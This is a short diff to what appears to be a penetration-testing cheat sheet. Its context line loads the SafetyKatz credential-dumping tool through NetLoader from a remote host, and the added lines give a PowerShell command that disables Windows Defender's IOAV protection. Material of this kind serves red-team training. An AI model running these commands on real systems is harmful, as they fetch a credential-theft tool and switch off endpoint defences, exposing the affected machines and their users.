@@ -140,4 +140,9 @@ __NetLoader__
 NetLoader.exe -path $IP/safetykatz.exe
 ```
 
+---
+### Disable Windows Defender
+```powershell
+Set-MpPreference -DisableIOAVProtection $true
+```
 
